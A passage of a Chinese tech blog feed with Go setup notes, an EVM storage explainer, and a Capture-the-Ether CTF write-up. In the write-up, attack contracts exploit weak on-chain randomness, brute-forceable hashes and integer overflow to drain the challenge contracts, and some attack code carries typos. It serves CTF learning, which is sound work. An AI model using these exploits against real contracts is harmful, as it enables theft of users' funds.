    <content type="html"><![CDATA[<p>Go语言开发了适用于以下操作系统的编译器：</p><ul><li>Linux</li><li>FreeBSD</li><li>Mac OS X</li></ul><h1 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h1><ol><li><p>添加PATH变量</p><p>Go 开发环境依赖于一些操作系统环境变量，你最好在安装 Go 之前就已经设置好他们。</p><p>这里列举几个最为重要的环境变量：</p><ul><li><code>$GOROOT</code>表示<code>Go</code>在你的电脑上的安装位置，它的值一般都是<code> $HOME/go</code>，当然，你也可以安装在别的地方。</li><li><code>$GOPATH</code>默认采用和<code>$GOROOT</code>一样的值，但从<code>Go 1.1</code>版本开始，你必须修改为其它路径。它可以包含多个<code>Go</code>语言源码文件、包文件和可执行文件的路径，而这些路径下又必须分别包含三个规定的目录：<code>src、pkg 和 bin</code>，这三个目录分别用于存放源码文件、包文件和可执行文件。</li></ul><p>接下来让我们继续安装吧：</p><ul><li><p>Linux</p><ul><li>配置环境变量：<code>export GOROOT=$HOME/go</code></li><li>保证在文件系统的任何地方都能调用相关文件：<code>export PATH=$PATH:$GOROOT/bin</code></li><li>配置Go项目的工作目录：<code>export GOPATH=$HOME/Applications/Go</code></li><li>在完成上述设置后，需要在终端输入<code>source .bashrc</code>以使这些环境变量生效。然后重启终端，输入<code>go env</code>来检查环境变量是否设置正确。</li></ul></li><li><p>Windows</p><p> 默认安装在目录<code>c:/go</code>下。</p></li></ul></li><li><p>下载二进制包</p><ul><li><p>Linux</p><p> 在安装Go之前你需要先安装相关的C工具。</p><p> <code>sudo apt-get install bison ed gawk gcc libc6-dev make</code>（此处为Ubuntu的指令，你也可以需要将工具分开安装）</p><p> 接着去官网或镜像网站下载Go的源码包到计算机中，然后将解压后的目录<code>go</code>通过命令移动到<code>$GOROOT</code>的位置。</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">wget https://storage.googleapis.com/golang/go&lt;VERSION&gt;.src.tar.gz<br>tar -zxvf go&lt;VERSION&gt;.src.tar.gz<br>sudo mv go $GOROOT<br></code></pre></td></tr></table></figure></li><li><p>Mac</p></li><li><p>Windows</p></li></ul></li><li><p>安装</p><p>你的<code>Go</code>安装目录 (<code>$GOROOT</code>) 的文件夹结构应该如下所示：</p><p><code>README.md, AUTHORS, CONTRIBUTORS, LICENSE</code></p><ul><li><code>/bin</code>：包含可执行文件，如：编译器，Go工具</li><li><code>/doc</code>：包含文档模版</li><li><code>/lib</code>：包含示例程序，代码工具，本地文档等</li><li><code>/misc</code>：包含与支持Go编辑器有关的配置文件以及cgo的示例</li><li><code>/os_arch</code>：包含标准库的包的对象文件 (.a)</li><li><code>/src</code>：包含源代码构建脚本和标准库的包的完整源代码（Go是一门开源语言）</li><li><code>/src/cmd</code>：包含Go和C的编译器和命令行脚本</li></ul></li><li><p>添加</p></li><li><p>安装测试</p><p>在一个文件夹中新建test.go文件，</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   fmt.Println(<span class="hljs-string">&quot;Hello, World!&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>通过go命令执行以上代码输出结果如下：<br><code>go run test.go</code></p><p>还可以通过<code>go build</code>命令生成二进制文件</p></li><li><p>验证安装版本</p></li></ol><p>可以通过在终端输入<code>go version</code>来打印Go的版本信息。</p><p>在创建目录的时候，文件夹名称永远不应该包含空格，而应该使用下划线’_’或者其他一般符号代替。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Go语言开发了适用于以下操作系统的编译器：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Linux&lt;/li&gt;
&lt;li&gt;FreeBSD&lt;/li&gt;
&lt;li&gt;Mac OS X&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;环境安装&quot;&gt;&lt;a href=&quot;#环境安装&quot; class=&quot;headerlink&quot; t</summary>
      
    
    
    
    <category term="Golang" scheme="http://lexlady.top/categories/Golang/"/>
    
    
  </entry>
  
  <entry>
    <title>Golang</title>
    <link href="http://lexlady.top/2023/04/28/Golang/Golang/"/>
    <id>http://lexlady.top/2023/04/28/Golang/Golang/</id>
    <published>2023-04-28T02:05:02.362Z</published>
    <updated>2023-07-31T13:39:54.391Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>为了解决在软件开发过程中的一些令人头疼的问题并尝试设计一门全新的编程语言，且不是用奇怪的语法和晦涩难懂的概念来从根本上推翻已有的编程语言。</p><p><code>Go</code>语言就在这样的环境下诞生了，它让人感觉像是<code>Python</code>或<code>Ruby</code>这样的动态语言，却又拥有像<code>C</code>或者<code>Java</code>这类语言的高性能和安全性。</p><p>它提倡通过接口来面向对象编程，通过<code>goroutine</code>和<code>channel</code>来支持并发和并行编程。</p><h2 id="GO语言特色"><a href="#GO语言特色" class="headerlink" title="GO语言特色"></a>GO语言特色</h2><ul><li>简洁、快速、安全</li><li>从本质上实现并发编程</li><li>使用静态类型，执行速度非常快</li><li>作为强类型语言，隐式的类型转换是不被允许的<br>Go语言通过改善或去除在C、C++或Java中一些特性来使开发更加便利，例如变量的默认初始化，内存分配和自动回收。</li></ul><p>所有的行为都突出一个宗旨：减少不必要的编码工作使代码更加简洁，从而比传统的面向对象语言更容易阅读和理解。</p><h2 id="GO用途"><a href="#GO用途" class="headerlink" title="GO用途"></a>GO用途</h2><p>Go 语言的主要目标是将静态语言的安全性和高效性与动态语言的易开发性进行有机结合，达到完美平衡；</p><p>用于实现一般目标的语言，例如对文本的处理，前端展现，像脚本一样使用…</p><p>另一个目标是对于网络通信、并发和并行编程的极佳支持，从而更好地利用大量的分布式和多核的计算机。</p><p>用于Web服务器的开发</p><blockquote><p>记住，学习一门新语言的最佳方式就是实践，运行它的代码，修改并尝试更多的方案。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;为了解决在软件开发过程中的一些令人头疼的问题并尝试设计一门全新的编程语言，且不是用奇怪的语法和晦涩难懂的概念来从根本上推翻已有的编程语言。&lt;</summary>
      
    
    
    
    <category term="Golang" scheme="http://lexlady.top/categories/Golang/"/>
    
    
    <category term="教程" scheme="http://lexlady.top/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>web3.js</title>
    <link href="http://lexlady.top/2023/04/11/web3-js/"/>
    <id>http://lexlady.top/2023/04/11/web3-js/</id>
    <published>2023-04-11T09:25:58.000Z</published>
    <updated>2023-04-11T09:25:58.473Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>temp</title>
    <link href="http://lexlady.top/2023/04/08/temp/"/>
    <id>http://lexlady.top/2023/04/08/temp/</id>
    <published>2023-04-08T09:27:22.000Z</published>
    <updated>2023-04-08T09:38:42.648Z</updated>
    
    <content type="html"><![CDATA[<h1 id="以太坊的数据存储"><a href="#以太坊的数据存储" class="headerlink" title="以太坊的数据存储"></a>以太坊的数据存储</h1><p>对于固定大小的变量EVM会直接将他们按顺序从0开始存储在每个存储位中，每个存储位都是32字节（256bit），是一种键值对的形式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity^0.8.10;<br><br>contract test&#123;<br>    uint256 public a=9;<br>    uint256[2] public b;<br>    address c;<br>    function t() public &#123;<br>        b[0] = 63;<br>        b[1] =96;<br>        c = msg.sender;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/08/temp/storage_structure_11.png"><br>这里就可以看到对于32字节固定长度的数据每个都占据一个key，key&#x3D;1对应变量a的存储位。key&#x3D;1，2对应变量b的两个存储位。相应的value便是变量的值。<br>因为在EVM中存储数据是需要消耗gas的，不论是永久的storage还是内存的memory只是消耗的gas量不同（storage比memory更昂贵），所以solidity里进行了一定的存储优化，简单来讲，即定义的这个变量所占的空间小于32个字节时，它所占据的这个存储位的空间可以与它后面的变量共享（当然前提是这个变量塞的下去）因为在EVM里将数据写入一个新位置和写入一个已经分配出来的位置所需的gas是不一样的。</p><p><code>uint16 public d=12;  uint16 public g=8;  bytes16 public name=&quot;lex&quot;;</code><br><img src="/2023/04/08/temp/storage_structure_12.png"><br>可以看到上面三个变量占用了同一个存储位key&#x3D;0，但占 用着空间的不同位置。实现了存储的共享<br>对于动态数据的存储，有着自己的计算规则：<code>keccak256(bytes32(key)+bytes32(position))</code>此处的key为映射的key，position则是定义变量的位置。根据此式我们可以算出变量存储位置</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;以太坊的数据存储&quot;&gt;&lt;a href=&quot;#以太坊的数据存储&quot; class=&quot;headerlink&quot; title=&quot;以太坊的数据存储&quot;&gt;&lt;/a&gt;以太坊的数据存储&lt;/h1&gt;&lt;p&gt;对于固定大小的变量EVM会直接将他们按顺序从0开始存储在每个存储位中，每个存储位都是32字节</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Capture-the-Ether</title>
    <link href="http://lexlady.top/2023/04/01/Capture-the-Ether/"/>
    <id>http://lexlady.top/2023/04/01/Capture-the-Ether/</id>
    <published>2023-04-01T13:48:19.000Z</published>
    <updated>2023-05-23T06:12:10.369Z</updated>
    
    <content type="html"><![CDATA[<p>由于Ropsten测试网络在2022.10.5日起已被正式弃用；因此该网页上的在线编写功能无法正常运行；所有实现均在remix上复现，收录在本系列之中，希望对各位看官有所帮助<br><del>(TvT)</del> <del>(TvT)</del> <del>(TvT)</del> <del>(TvT)</del> <del>(TvT)</del></p><span id="more"></span><h1 id="Lotteries"><a href="#Lotteries" class="headerlink" title="Lotteries"></a>Lotteries</h1><h2 id="Guess-Number"><a href="#Guess-Number" class="headerlink" title="Guess Number"></a>Guess Number</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract GuessTheNumberChallenge &#123;<br>    uint8 answer = 42;<br><br>    function GuessTheNumberChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function guess(uint8 n) public payable &#123;<br>        require(msg.value == 1 ether);<br><br>        if (n == answer) &#123;<br>            msg.sender.transfer(2 ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>题目直接给出了答案，直接填<br><img src="/2023/04/01/Capture-the-Ether/GuessNumber_1.png"><img src="/2023/04/01/Capture-the-Ether/GuessNumber_2.png"><br>对于一个普通的数字，通过枚举它总是可以被猜中的，同时当有人知道了答案时，他就能直接获取奖励，很显然这对于其他不知道答案的人是极其不公平的；因此，我们对其进行处理改进：</p><h2 id="The-Secret-Number"><a href="#The-Secret-Number" class="headerlink" title="The Secret Number"></a>The Secret Number</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract GuessTheSecretNumberChallenge &#123;<br>    ---不同点---<br>    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;<br><br>    function GuessTheSecretNumberChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>    &#125;<br>    <br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function guess(uint8 n) public payable &#123;<br>        require(msg.value == 1 ether);<br><br>        if (keccak256(n) == answerHash) &#123;<br>            msg.sender.transfer(2 ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>由于结果是一个uint8的hash值所以我们只能够进行暴力枚举。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">contract attack&#123;<br>    function sol() public returns (uint8)&#123;<br>        for(uint8 i=0;i&lt;255;i++)&#123;<br>            if(keccak256(i)==<br>            0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365)<br>            &#123;retuen i;&#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>实现：<br><img src="/2023/04/01/Capture-the-Ether/SecNumber_1.png"><br><img src="/2023/04/01/Capture-the-Ether/SecNumber_2.png"><br>这样的操作也只是避免了直接获取结果得出答案的情况——哈希算法是不可逆的加密算法，一定程度上提高了安全性，但仍然可以暴力枚举破解。</p><h2 id="The-Randon-Number"><a href="#The-Randon-Number" class="headerlink" title="The Randon Number"></a>The Randon Number</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract GuessTheRandomNumberChallenge &#123;<br>    uint8 answer;<br><br>    function GuessTheRandomNumberChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>        ---不同点---<br>        answer = uint8(keccak256(block.blockhash(block.number - 1), now));<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function guess(uint8 n) public payable &#123;<br>        require(msg.value == 1 ether);<br><br>        if (n == answer) &#123;<br>            msg.sender.transfer(2 ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这次的结果是根据当前的区块数和时间来制定的，他是随机的，这样就大大的增强了安全强度，避免了反复使用一个结果。<br>通过web3查询部署该合约时当前的区块高度和时间来得到answer，再进行输入即可。<br>先获取合约所在块的高度或者区块哈希<br><code>web3.eth.getTransaction(transactionHash).BlockNumber\BlockHash</code><br>再通过区块高度或区块哈希找当前区块的timestamp<br><code>web3.eth.getBlock(BlockNumber).timestamp</code><br>可以从返回值中看到</p><blockquote><p>另外，由于answer是存储在合约中的（storage）因此，只要我们理解了他是如何存储的我们也能够通过<code>ethers.js</code>中的<code>getStorageAt</code>方法来获取answer的值</p></blockquote><h2 id="The-New-Number"><a href="#The-New-Number" class="headerlink" title="The New Number"></a>The New Number</h2><p>在上一个的合约代码中我们可以看到answer是在合约部署时就已经赋值了，而这次我们将其放在方法中，只有在有用户使用这个方法时才对answer进行赋值操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract GuessTheNewNumberChallenge &#123;<br>    function GuessTheNewNumberChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function guess(uint8 n) public payable &#123;<br>        require(msg.value == 1 ether);<br>        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));<br><br>        if (n == answer) &#123;<br>            msg.sender.transfer(2 ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>由于block.number状态变量允许获取当前块的高度。但是，在EVM中执行事务的那一刻，由于显而易见的原因，尚未知道正在创建的块的blockhash，所以我们无法通过web3进行查询，但是在我们调用这一合约时，是在同一个区块进行的，也就是说通过攻击合约进行模拟挑战中的所有操作然后调用<code>guess</code>方法，而不需要通过在链下进行计算再提交答案并保证交易在下一区块立即被挖矿的情形。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">contract attack&#123;<br>    GuessTheNewNumberChallenge gus;<br>    function attack(address _add) public&#123;<br>        gue = GuessTheNewNumberChallenge(_add);<br>    &#125;<br>    function att()public payable&#123;<br>        uint8 val = uint8(keccak256(block.blockhash(block.number - 1), now));<br>        gue.guess.value(1 ether)(val);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Predict-the-future"><a href="#Predict-the-future" class="headerlink" title="Predict the future"></a>Predict the future</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract PredictTheFutureChallenge &#123;<br>    address guesser;<br>    uint8 guess;<br>    uint256 settlementBlockNumber;<br><br>    function PredictTheFutureChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function lockInGuess(uint8 n) public payable &#123;<br>        require(guesser == 0);<br>        require(msg.value == 1 ether);<br><br>        guesser = msg.sender;<br>        guess = n;<br>        settlementBlockNumber = block.number + 1;<br>    &#125;<br><br>    function settle() public &#123;<br>        require(msg.sender == guesser);<br>        require(block.number &gt; settlementBlockNumber);<br><br>        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;<br><br>        guesser = 0;<br>        if (guess == answer) &#123;<br>            msg.sender.transfer(2 ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>先下注，后开奖。由于不能预测未来区块的内容，所以对于answer我们无法准确掌握，但是这里的answer是一个0~9的数，因此我们可以设定一个值等待answer自己撞上来。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract attack&#123;<br>    PredictTheFutureChallenge pre;<br>    uint8 public answer=2;      <br>    function attack(address _add)public&#123;<br>        pre = PredictTheFutureChallenge(_add);<br>    &#125;<br>    function lock()public payable &#123;<br>        pre.lockInGuess.value(1 ether)(answer);<br>    &#125;<br>    function sol() public &#123;<br>        uint8 temp = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;<br>        if(temp == answer)&#123;<br>            pre.settle();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Predict-the-block-hash"><a href="#Predict-the-block-hash" class="headerlink" title="Predict the block hash"></a>Predict the block hash</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract PredictTheBlockHashChallenge &#123;<br>    address guesser;<br>    bytes32 guess;<br>    uint256 settlementBlockNumber;<br><br>    function PredictTheBlockHashChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function lockInGuess(bytes32 hash) public payable &#123;<br>        require(guesser == 0);<br>        require(msg.value == 1 ether);<br><br>        guesser = msg.sender;<br>        guess = hash;<br>        settlementBlockNumber = block.number + 1;<br>    &#125;<br><br>    function settle() public &#123;<br>        require(msg.sender == guesser);<br>        require(block.number &gt; settlementBlockNumber);<br><br>        bytes32 answer = block.blockhash(settlementBlockNumber);<br><br>        guesser = 0;<br>        if (guess == answer) &#123;<br>            msg.sender.transfer(2 ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>同样是预测未来区块的内容，显然这根本是不可能的。但是在EVM中block.blockhash保存的最大数目是最近的256个区块，也即是说当超出最新区块256个区块之后的block.blockhash将被置为0。<br>因此我们同样只需要等。（10s一个块，256*10&#x2F;60 过个一小时吧（笑）</p><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Token-sale"><a href="#Token-sale" class="headerlink" title="Token sale"></a>Token sale</h2><p>要求：转走合约中的余额</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract TokenSaleChallenge &#123;<br>    mapping(address =&gt; uint256) public balanceOf;<br>    uint256 constant PRICE_PER_TOKEN = 1 ether;<br><br>    function TokenSaleChallenge(address _player) public payable &#123;<br>        require(msg.value == 1 ether);<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance &lt; 1 ether;<br>    &#125;<br><br>    function buy(uint256 numTokens) public payable &#123;<br>        require(msg.value == numTokens * PRICE_PER_TOKEN);<br><br>        balanceOf[msg.sender] += numTokens;<br>    &#125;<br><br>    function sell(uint256 numTokens) public &#123;<br>        require(balanceOf[msg.sender] &gt;= numTokens);<br><br>        balanceOf[msg.sender] -= numTokens;<br>        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析：因为合约的货币只有两个方法<code>sell()</code>、<code>buy()</code>，所以我们只有卖出比我们所购买的更多的货币才能达成<code>address(this).balance &lt; 1 ether</code>的条件。<br>在买入时有这么一个检查：<code>require(msg.value == numToken * PRICE_PER_TOKEN)</code>，因为<code>PRICE_PER_TOKEN</code>是一个不可修改的值，但可以通过与<code>numToken</code>的乘积进行溢出，从而绕过检查<br>uint256的最大值为2^256-1：<code>115792089237316195423570985008687907853269984665640564039457584007913129639935</code><br>，所以该值除以10^18后添个一就是造成溢出的最小值：<code>115792089237316195423570985008687907853269984665640564039457 + 1</code><br>溢出的结果为<code>415992086870360064</code><br>所以我们只需要发送415992086870360064wei，提出115792089237316195423570985008687907853269984665640564039458的购买量就能够获得大量的货币。之后，我们卖出1 ether来完成挑战</p><h2 id="Token-Whale"><a href="#Token-Whale" class="headerlink" title="Token Whale"></a>Token Whale</h2><p>要求：拥有1,000,000的余额</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract TokenWhaleChallenge &#123;<br>    address player;<br><br>    uint256 public totalSupply;<br>    mapping(address =&gt; uint256) public balanceOf;<br>    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;<br><br>    string public name = &quot;Simple ERC20 Token&quot;;<br>    string public symbol = &quot;SET&quot;;<br>    uint8 public decimals = 18;<br><br>    function TokenWhaleChallenge(address _player) public &#123;<br>        player = _player;<br>        totalSupply = 1000;<br>        balanceOf[player] = 1000;<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return balanceOf[player] &gt;= 1000000;<br>    &#125;<br><br>    event Transfer(address indexed from, address indexed to, uint256 value);<br><br>    function _transfer(address to, uint256 value) internal &#123;<br>        balanceOf[msg.sender] -= value;<br>        balanceOf[to] += value;<br><br>        emit Transfer(msg.sender, to, value);<br>    &#125;<br><br>    function transfer(address to, uint256 value) public &#123;<br>        require(balanceOf[msg.sender] &gt;= value);<br>        require(balanceOf[to] + value &gt;= balanceOf[to]);<br><br>        _transfer(to, value);<br>    &#125;<br><br>    event Approval(address indexed owner, address indexed spender, uint256 value);<br><br>    function approve(address spender, uint256 value) public &#123;<br>        allowance[msg.sender][spender] = value;<br>        emit Approval(msg.sender, spender, value);<br>    &#125;<br><br>    function transferFrom(address from, address to, uint256 value) public &#123;<br>        require(balanceOf[from] &gt;= value);<br>        require(balanceOf[to] + value &gt;= balanceOf[to]);<br>        require(allowance[from][msg.sender] &gt;= value);<br><br>        allowance[from][msg.sender] -= value;<br>        _transfer(to, value);<br>    